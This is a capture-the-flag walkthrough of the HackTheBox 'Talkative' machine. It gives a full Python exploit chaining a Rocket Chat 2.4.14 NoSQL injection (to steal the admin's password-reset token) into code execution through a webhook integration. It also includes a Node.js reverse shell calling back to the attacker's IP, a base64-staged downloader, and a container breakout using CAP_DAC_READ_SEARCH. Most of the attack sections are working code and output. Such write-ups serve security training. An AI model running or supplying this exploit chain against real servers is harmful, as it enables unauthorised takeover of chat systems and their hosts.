# [talkative](https://app.hackthebox.com/machines/Talkative)

> A Linux server belonging to Talkative, a mass communication platform organization. The server is hosting their chat web application ([Rocket Chat](https://rocket.chat/)) and spreadsheet web application ([Jamovi](https://www.jamovi.org/)). The Rocket Chat application is vulnerable to an NoSQL injection that leads to RCE. The resultant access is a `root` shell in a restrictive Rocket Chat Docker container. The container has been configured with `CAP_DAC_READ_SEARCH`, which can be exploited to read an arbitrary file on the host or `chroot` to the host's root directory, effectively breaking out of the container.

---

## Open Port Enumeration

### TCP

TCP ports 80, 3000, 8080, 8081, and 8082 are open.

```bash
$ sudo masscan -p1-65535 --rate=1000 -e tun0 --output-format grepable --output-filename enum/talkative.masscan 10.129.129.147
$ cat enum/talkative.masscan  | grep open | cut -d' ' -f5 | cut -d'/' -f1 | sort -u | tr '\n' ','
3000,80,8080,8081,8082,
```

Apache 2.4.52 is running on port 80. Its server header indicates the target's operating system is Debian. The web application redirects to `http://talkative.htb`. Add this hostname to the local DNS resolver.

An unknown web application is running on port 3000.

[Tornado httpd 5.0](https://www.tornadoweb.org/en/stable/), a Python web framework, is running on ports 8080, 8081, and 8082. Port 8080's HTTP title indicates it might be running [jamovi](https://www.jamovi.org/).

```bash
$ nmap -sC -sV -p3000,80,8080,8081,8082 -oA enum/talkative 10.129.129.147
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-15 13:16 UTC
Nmap scan report for ip-10-129-129-147.us-east-2.compute.internal (10.129.129.147)
Host is up (0.018s latency).

PORT     STATE SERVICE VERSION
80/tcp   open  http    Apache httpd 2.4.52
|_http-server-header: Apache/2.4.52 (Debian)
|_http-title: Did not follow redirect to http://talkative.htb
3000/tcp open  ppp?
| fingerprint-strings:
|   GetRequest, HTTPOptions:
|     HTTP/1.1 200 OK
|     X-XSS-Protection: 1
|     X-Instance-ID: QZ5ekSgSib55WCPKM
|     Content-Type: text/html; charset=utf-8
|     Vary: Accept-Encoding
|     Date: Fri, 15 Apr 2022 13:17:03 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <link rel="stylesheet" type="text/css" class="__meteor-css__" href="/3ab95015403368c507c78b4228d38a494ef33a08.css?meteor_css_resource=true">
|     <meta charset="utf-8" />
|     <meta http-equiv="content-type" content="text/html; charset=utf-8" />
|     <meta http-equiv="expires" content="-1" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge" />
|     <meta name="fragment" content="!" />
|     <meta name="distribution" content="global" />
|     <meta name="rating" content="general" />
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
|     <meta name="mobile-web-app-capable" content="yes" />
|     <meta name="apple-mobile-web-app-capable" conten
|   Help, NCP:
|_    HTTP/1.1 400 Bad Request
8080/tcp open  http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: jamovi
8081/tcp open  http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
8082/tcp open  http    Tornado httpd 5.0
|_http-server-header: TornadoServer/5.0
|_http-title: 404: Not Found
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port3000-TCP:V=7.91%I=7%D=4/15%Time=6259704F%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20QZ5ekSgSib55WCPKM\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2015\x20Apr\x202
SF:022\x2013:17:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten")%r(Help,1C,"HTTP/1\.1\x20400\x20Bad\x20Request
SF:\r\n\r\n")%r(NCP,1C,"HTTP/1\.1\x20400\x20Bad\x20Request\r\n\r\n")%r(HTT
SF:POptions,31BA,"HTTP/1\.1\x20200\x20OK\r\nX-XSS-Protection:\x201\r\nX-In
SF:stance-ID:\x20QZ5ekSgSib55WCPKM\r\nContent-Type:\x20text/html;\x20chars
SF:et=utf-8\r\nVary:\x20Accept-Encoding\r\nDate:\x20Fri,\x2015\x20Apr\x202
SF:022\x2013:17:03\x20GMT\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html
SF:>\n<html>\n<head>\n\x20\x20<link\x20rel=\"stylesheet\"\x20type=\"text/c
SF:ss\"\x20class=\"__meteor-css__\"\x20href=\"/3ab95015403368c507c78b4228d
SF:38a494ef33a08\.css\?meteor_css_resource=true\">\n<meta\x20charset=\"utf
SF:-8\"\x20/>\n\t<meta\x20http-equiv=\"content-type\"\x20content=\"text/ht
SF:ml;\x20charset=utf-8\"\x20/>\n\t<meta\x20http-equiv=\"expires\"\x20cont
SF:ent=\"-1\"\x20/>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=
SF:\"IE=edge\"\x20/>\n\t<meta\x20name=\"fragment\"\x20content=\"!\"\x20/>\
SF:n\t<meta\x20name=\"distribution\"\x20content=\"global\"\x20/>\n\t<meta\
SF:x20name=\"rating\"\x20content=\"general\"\x20/>\n\t<meta\x20name=\"view
SF:port\"\x20content=\"width=device-width,\x20initial-scale=1,\x20maximum-
SF:scale=1,\x20user-scalable=no\"\x20/>\n\t<meta\x20name=\"mobile-web-app-
SF:capable\"\x20content=\"yes\"\x20/>\n\t<meta\x20name=\"apple-mobile-web-
SF:app-capable\"\x20conten");
Service Info: Host: 172.17.0.17

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.72 seconds
```

### UDP

There are no open UDP ports.

```bash
$ sudo nmap -sU 10.1291.29.147
Starting Nmap 7.91 ( https://nmap.org ) at 2022-04-15 13:17 UTC
Nmap scan report for ip-10-129-129-147.us-east-2.compute.internal (10.129.129.147)
Host is up (0.018s latency).
Not shown: 999 closed ports
PORT   STATE         SERVICE
68/udp open|filtered dhcpc

Nmap done: 1 IP address (1 host up) scanned in 1087.08 seconds
```

---

## Port 80 Enumeration

The website of Talkative, the organization behind a free, open-source communication platform of its same name.

The website reveals the names of some of its C-suite officers: [Saul Goodman](http://talkative.htb/person/saul-goodman), [Matt Williams](http://talkative.htb/person/matt-williams), and [Janit Smith](http://talkative.htb/person/janit-smith). Pages for each of these officers reveals their email addresses.

```txt
saul@talkative.htb
matt@talkative.htb
janit@talkative.htb
```

It also advertises three products. TALKZONE is Talkative's traditional communication application for individuals and groups.

[TALKFORBIZ](http://talkative.htb/product/exclusive-directional-strategy) is Talkative's enterprise communication application, powered by [Rocket Chat](https://rocket.chat/). It is possible to create a free account *with an invitation*.

[TALK-A-STATS](http://talkative.htb/product/talk-a-stats-coming-soon) is a spreadsheet application, powered by [Jamovi](https://www.jamovi.org/). It is currently in beta.

### Content Discovery

```bash
$ gobuster dir -u http://talkative.htb -w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://talkative.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-small-words.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/04/16 01:13:11 Starting gobuster in directory enumeration mode
===============================================================
/.html                (Status: 403) [Size: 278]
/search               (Status: 200) [Size: 15838]
/.htm                 (Status: 403) [Size: 278]
/files                (Status: 301) [Size: 314] [--> http://talkative.htb/files/]
/page                 (Status: 200) [Size: 16163]
/en                   (Status: 301) [Size: 342] [--> http://talkative.htb/en/]
/assets               (Status: 301) [Size: 315] [--> http://talkative.htb/assets/]
/product              (Status: 200) [Size: 18466]
/pages                (Status: 200) [Size: 16163]
/de                   (Status: 301) [Size: 342] [--> http://talkative.htb/de/]
/products             (Status: 200) [Size: 18466]
/fr                   (Status: 301) [Size: 342] [--> http://talkative.htb/fr/]
/es                   (Status: 301) [Size: 342] [--> http://talkative.htb/es/]
/it                   (Status: 301) [Size: 342] [--> http://talkative.htb/it/]
/ru                   (Status: 301) [Size: 342] [--> http://talkative.htb/ru/]
/nl                   (Status: 301) [Size: 342] [--> http://talkative.htb/nl/]
/pl                   (Status: 301) [Size: 342] [--> http://talkative.htb/pl/]
/.htaccess            (Status: 403) [Size: 278]
/thumbs               (Status: 301) [Size: 315] [--> http://talkative.htb/thumbs/]
/ja                   (Status: 301) [Size: 342] [--> http://talkative.htb/ja/]
/theme                (Status: 301) [Size: 314] [--> http://talkative.htb/theme/]
/hu                   (Status: 301) [Size: 342] [--> http://talkative.htb/hu/]
/people               (Status: 200) [Size: 18386]
/is                   (Status: 301) [Size: 342] [--> http://talkative.htb/is/]
Progress: 1071 / 43004 (2.49%)                                                   [ERROR] 2022/04/16 01:15:13 [!] Get "http://talkative.htb/research": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
/homepage             (Status: 200) [Size: 37217]
/.htc                 (Status: 403) [Size: 278]
/person               (Status: 200) [Size: 18386]
/.html_var_DE         (Status: 403) [Size: 278]
/nb                   (Status: 301) [Size: 342] [--> http://talkative.htb/nb/]
/server-status        (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/.html.               (Status: 403) [Size: 278]
/.html.html           (Status: 403) [Size: 278]
/.htpasswds           (Status: 403) [Size: 278]
/nn                   (Status: 301) [Size: 342] [--> http://talkative.htb/nn/]
/.htm.                (Status: 403) [Size: 278]
/nl_NL                (Status: 301) [Size: 354] [--> http://talkative.htb/nl_NL/]
/.htmll               (Status: 403) [Size: 278]
/.html.old            (Status: 403) [Size: 278]
/.ht                  (Status: 403) [Size: 278]
/.html.bak            (Status: 403) [Size: 278]
/bundles              (Status: 301) [Size: 316] [--> http://talkative.htb/bundles/]
/.htm.htm             (Status: 403) [Size: 278]
/pt_BR                (Status: 301) [Size: 354] [--> http://talkative.htb/pt_BR/]
/.hta                 (Status: 403) [Size: 278]
/.htgroup             (Status: 403) [Size: 278]
/.html1               (Status: 403) [Size: 278]
/.html.LCK            (Status: 403) [Size: 278]
/.html.printable      (Status: 403) [Size: 278]
/.htm.LCK             (Status: 403) [Size: 278]
/.htaccess.bak        (Status: 403) [Size: 278]
/.html.php            (Status: 403) [Size: 278]
/.htmls               (Status: 403) [Size: 278]
/.htx                 (Status: 403) [Size: 278]
/.htlm                (Status: 403) [Size: 278]
/.html-               (Status: 403) [Size: 278]
/.htm2                (Status: 403) [Size: 278]
/.htuser              (Status: 403) [Size: 278]
/nl_BE                (Status: 301) [Size: 354] [--> http://talkative.htb/nl_BE/]

===============================================================
2022/04/16 02:36:28 Finished
===============================================================
```

### Virtual Host Discovery

All virtual hosts return 301s.

```bash
$ gobuster vhost -u http://talkative.htb -w /usr/share/wordlists/subdomains-top1million-5000.txt --timeout 3s -o vhosts.txt
$ gobuster-to-vhost --file vhosts.txt | jq '.[] | select(.status != 301)'

```

---

## Rocket Chat 2.4.14 RCE

TALKABIZ Rocket Chat instance. The version is 2.4.14.

```bash
$ curl http://talkative.htb:3000/api/info
{"version":"2.4.14","success":true}
```

Anyone can register an account. Do so with the credential `tgihf@talkative.htb`:`password`.

Saul Goodman is `admin`.

There is an [authenticated NoSQL injection vulnerability](https://blog.sonarsource.com/nosql-injections-in-rocket-chat) that leads to RCE in Rocket Chat <= 3.12.1. It requires the creation of an account, which is possible by anyone. After attempting to reset the `admin` account's password, it is possible to exploit the NoSQL injection to disclose the `admin`'s reset password token, which can subsequently be used to reset their password. With administrative access, an "integration" can be configured to execute arbitrary commands on the server. Unfortunately, [the typical exploit](https://www.exploit-db.com/exploits/50108) for this vulnerability was designed for Rocket Chat 3.12.1. The target's version is 2.4.14, and many of the API endpoints between the two are different. The following script walks through this exploit chain with the 2.4.14 endpoints.

```python
import argparse
import json
from typing import Tuple

import requests


def authenticate(url: str, username: str, password: str) -> Tuple[dict, dict]:
    response = requests.post(
        f"{url}/api/v1/login",
        json={"user": username, "password": password},
        allow_redirects=False
    )
    data = response.json()
    user_id = data["data"]["userId"]
    token = data["data"]["authToken"]
    cookies = {'rc_uid': user_id,'rc_token': token}
    headers = {'X-User-Id': user_id,'X-Auth-Token': token}
    return cookies, headers

    
def rce(url: str, admin: str, password: str, cmd: str) -> str:

    # Authenticate as admin
    cookies, headers = authenticate(url, admin, password)

    # Create integration to execute cmd
    response = requests.post(
        f"{url}/api/v1/integrations.create",
        cookies=cookies,
        headers=headers,
        json={
            "enabled": True,
            "channel": "#general",
            "username": "admin",
            "name": "rce",
            "alias": "",
            "avatarUrl": "",
            "emoji": "",
            "scriptEnabled": True,
            "script": f"""
class Script {{
    process_incoming_request({{ request }}) {{
        const require = console.log.constructor('return process.mainModule.require')();
        const {{ execSync }} = require('child_process');

        let output = "";
        try {{
            output = execSync('{cmd}').toString();
        }}
        catch (e) {{
            output = e.toString();
        }}

        return {{
            error: {{
                success: false,
                message: output
            }}
        }};
    }}
}}
""",
            "type": "webhook-incoming"
        }
    )
    data = response.json()
    integration_id: str = data["integration"]["_id"]
    token: str = data["integration"]["token"]

    # Trigger integration and return output
    response = requests.get(f"{url}/hooks/{integration_id}/{token}")
    data = response.json()
    if "message" in data:
        return data["message"]
    else:
        return json.dumps(data)


def main() -> None:
    parser = argparse.ArgumentParser(description="Rocket.Chat 2.4.14 RCE exploit for HTB Talkative")
    parser.add_argument("rocket_chat_url", help="Base Rocket.Chat URL")
    parser.add_argument("--user", required=True, help="Email address of low-privilege Rocket.Chat user")
    parser.add_argument("--password", required=True, help="Password of low-privileged Rocket.Chat user")
    parser.add_argument("--admin", required=True, help="Email address of admin user")
    args = parser.parse_args()

    cookies, headers = authenticate(args.rocket_chat_url, args.user, args.password)

    # Generate forgotten password code for admin account
    response = requests.post(
        f"{args.rocket_chat_url}/api/v1/users.forgotPassword",
        json={"email": args.admin},
        headers=headers,
        cookies=cookies
    )

    # NoSQL injection to leak admin's password reset token
    response = requests.get(
        f"{args.rocket_chat_url}/api/v1/users.list",
        params={"query": '{"$where": "this.username===\'admin\' && (()=>{throw JSON.stringify(this)})()"}'},
        cookies=cookies,
        headers=headers
    )
    data = response.text[46:-2]
    data = data.replace("\\", "")
    data = json.loads(data)
    reset_token = data["services"]["password"]["reset"]["token"]

    # Change admin's password
    print(f"[*] Manually navigate to {args.rocket_chat_url}/reset-password/{reset_token} to reset admin's password to {args.password}")
    input("[*] Press enter when you've done it... ")

    while True:
        cmd: str = input("$ ")
        if cmd.lower().strip() == "exit":
            break
        output: str = rce(args.rocket_chat_url, args.admin, args.password, cmd)
        print(output)

main()
```

The resultant access is a non-interactive shell as `root` on a restrictive Docker container.

```bash
$ python3 exploit.py --user tgihf@talkative.htb --password 'P@$$w0rd!1234' --admin saul@talkative.htb -- http://talkative.htb:3000
[*] Manually navigate to http://talkative.htb:3000/reset-password/BGVmzh0Q4fixImZDm1SDy7Vw-N43XuVleS0m5e9SPos to reset admin's password to P@$$w0rd!1234
[*] Press enter when you've done it...
$ id
uid=0(root) gid=0(root) groups=0(root)
```

The container lacks many of the typical tools for upgrading to an interactive shell, but it does have `node`. Base64-encode the following Node.js reverse shell payload and write it to the Docker container's disk.

```javascript
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("bash", []);
    var client = new net.Socket();
    client.connect(9000, "10.10.14.109", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application from crashing
})();
```

```bash
$ echo -n "KGZ1bmN0aW9uKCl7CiAgICB2YXIgbmV0ID0gcmVxdWlyZSgibmV0IiksCiAgICAgICAgY3AgPSByZXF1aXJlKCJjaGlsZF9wcm9jZXNzIiksCiAgICAgICAgc2ggPSBjcC5zcGF3bigiYmFzaCIsIFtdKTsKICAgIHZhciBjbGllbnQgPSBuZXcgbmV0LlNvY2tldCgpOwogICAgY2xpZW50LmNvbm5lY3QoOTAwMCwgIjEwLjEwLjE0LjEwOSIsIGZ1bmN0aW9uKCl7CiAgICAgICAgY2xpZW50LnBpcGUoc2guc3RkaW4pOwogICAgICAgIHNoLnN0ZG91dC5waXBlKGNsaWVudCk7CiAgICAgICAgc2guc3RkZXJyLnBpcGUoY2xpZW50KTsKICAgIH0pOwogICAgcmV0dXJuIC9hLzsgLy8gUHJldmVudHMgdGhlIE5vZGUuanMgYXBwbGljYXRpb24gZnJvbSBjcmFzaGluZwp9KSgpOw==" | base64 -d > /root/shell.js; node /root/shell.js
```

Start a reverse shell listener and execute the reverse shell for interactive access to the target.

---

## Transferring over CDK

Manual enumeration of the Docker container makes it seem fairly secure. Stage [cdk](https://github.com/cdk-team/CDK#installationdelivery) to the container for more in-depth enumeration.

Base64-encode the following Node.js HTTP client program, paste it into the command shell, and decode it on the target.

```javascript
// curl.js
const http = require('http'); // or 'https' for https:// URLs
const fs = require('fs');

const file = fs.createWriteStream(process.argv[3]);
const request = http.get(process.argv[2], function(response) {
   response.pipe(file);

   // after download completed close filestream
   file.on("finish", () => {
       file.close();
       console.log("Download Completed");
   });
});
```

```bash
echo -n "Ly8gY3VybC5qcwpjb25zdCBodHRwID0gcmVxdWlyZSgnaHR0cCcpOyAvLyBvciAnaHR0cHMnIGZvciBodHRwczovLyBVUkxzCmNvbnN0IGZzID0gcmVxdWlyZSgnZnMnKTsKCmNvbnN0IGZpbGUgPSBmcy5jcmVhdGVXcml0ZVN0cmVhbShwcm9jZXNzLmFyZ3ZbM10pOwpjb25zdCByZXF1ZXN0ID0gaHR0cC5nZXQocHJvY2Vzcy5hcmd2WzJdLCBmdW5jdGlvbihyZXNwb25zZSkgewogICByZXNwb25zZS5waXBlKGZpbGUpOwoKICAgLy8gYWZ0ZXIgZG93bmxvYWQgY29tcGxldGVkIGNsb3NlIGZpbGVzdHJlYW0KICAgZmlsZS5vbigiZmluaXNoIiwgKCkgPT4gewogICAgICAgZmlsZS5jbG9zZSgpOwogICAgICAgY29uc29sZS5sb2coIkRvd25sb2FkIENvbXBsZXRlZCIpOwogICB9KTsKfSk7" | base64 -d > /root/curl.js
```

Serve `cdk` over HTTP and use `curl.js` to stage it to the target.

```bash
$ node /root/curl.js http://10.10.14.109:8000/cdk /root/cdk
$ chmod /root/cdk
```

---

## CDK Enumeration & Privilege Escalation via `CAP_DAC_READ_SEARCH`

CDK highlights the `CAP_DAC_READ_SEARCH` capability of the current session. It indicates that this capability can be exploited to read files from the host by invoking `cdk run cap-dac-read-search`.

```bash
root@c150397ccd63:/root# ./cdk evaluate

[Information Gathering - System Info]
2022/04/19 03:15:46 current dir: /root
2022/04/19 03:15:46 current user: root uid: 0 gid: 0 home: /root
2022/04/19 03:15:46 hostname: c150397ccd63
2022/04/19 03:15:46 debian debian 10.10 kernel: 5.4.0-81-generic

[Information Gathering - Services]
2022/04/19 03:15:46 sensitive env found:
        DEPLOY_METHOD=docker-official

[Information Gathering - Commands and Capabilities]
2022/04/19 03:15:46 available commands:
        find,node,npm,apt,dpkg,mount,fdisk,base64,perl
2022/04/19 03:15:46 Capabilities hex of Caps(CapInh|CapPrm|CapEff|CapBnd|CapAmb):
        CapInh: 0000000000000000
        CapPrm: 00000000a80425fd
        CapEff: 00000000a80425fd
        CapBnd: 00000000a80425fd
        CapAmb: 0000000000000000
        Cap decode: 0x00000000a80425fd = CAP_CHOWN,CAP_DAC_READ_SEARCH,CAP_FOWNER,CAP_FSETID,CAP_KILL,CAP_SETGID,CAP_SETUID,CAP_SETPCAP,CAP_NET_BIND_SERVICE,CAP_NET_RAW,CAP_SYS_CHROOT,CAP_MKNOD,CAP_AUDIT_WRITE,CAP_SETFCAP
        Add capability list: CAP_DAC_READ_SEARCH
[*] Maybe you can exploit the Capabilities below:
[!] CAP_DAC_READ_SEARCH enabled. You can read files from host. Use 'cdk run cap-dac-read-search' ... for exploitation.

[Information Gathering - Mounts]
Device:/dev/mapper/ubuntu--vg-ubuntu--lv Path:/app/uploads Filesystem:ext4 Flags:rw,relatime

[Information Gathering - Net Namespace]
        container net namespace isolated.

[Information Gathering - Sysctl Variables]
2022/04/19 03:15:46 net.ipv4.conf.all.route_localnet = 0

[Discovery - K8s API Server]
2022/04/19 03:15:46 checking if api-server allows system:anonymous request.
err found while searching local K8s apiserver addr.:
err: cannot find kubernetes api host in ENV
        api-server forbids anonymous request.
        response:

[Discovery - K8s Service Account]
load K8s service account token error.:
open /var/run/secrets/kubernetes.io/serviceaccount/token: no such file or directory

[Discovery - Cloud Provider Metadata API]
2022/04/19 03:15:47 failed to dial Alibaba Cloud API.
2022/04/19 03:15:48 failed to dial Azure API.
2022/04/19 03:15:49 failed to dial Google Cloud API.
2022/04/19 03:15:50 failed to dial Tencent Cloud API.
2022/04/19 03:15:51 failed to dial OpenStack API.
2022/04/19 03:15:52 failed to dial Amazon Web Services (AWS) API.
2022/04/19 03:15:53 failed to dial ucloud API.
```

Looking at this option more closely, by passing the path to a file that is bind-mounted to the container from the host (i.e., `/etc/hostname`) as the first argument and `/` as the second, it is possible to `chroot` to the host's root directory and spawn a shell, effectively breaking out of the container.

```bash
root@c150397ccd63:/root# ./cdk run --list
...
cap-dac-read-search     Read files from host or chroot to host and spawn a cmd. The First argument is file bind-mounted to container from host (default: /etc/hostname), the second argument specifies which file to read (default: /etc/shadow), the third and remaining arguments specifies command executed in host root filesystem (default: /bin/bash). If there is one argument, the first argument is the target file to read. When second argument is "/", this exploit will spawn a cmd.
...
```

Invoke the command with these options and read the user and system flags from `/home/saul/user.txt` and `/root/root.txt`, respectively.

```bash
root@c150397ccd63:/root# ./cdk run cap-dac-read-search /etc/hostname /
Running with target: /, ref: /etc/hostname
executing command(/bin/bash)...
root@c150397ccd63:/# id
uid=0(root) gid=0(root) groups=0(root)
root@c150397ccd63:/root# ls -la /home/saul/user.txt
-rw-r----- 1 saul saul 33 Apr 19 02:48 /home/saul/user.txt
root@c150397ccd63:/root# ls -la /root/root.txt
-rw-r----- 1 root root 33 Apr 19 02:48 /root/root.txt
```
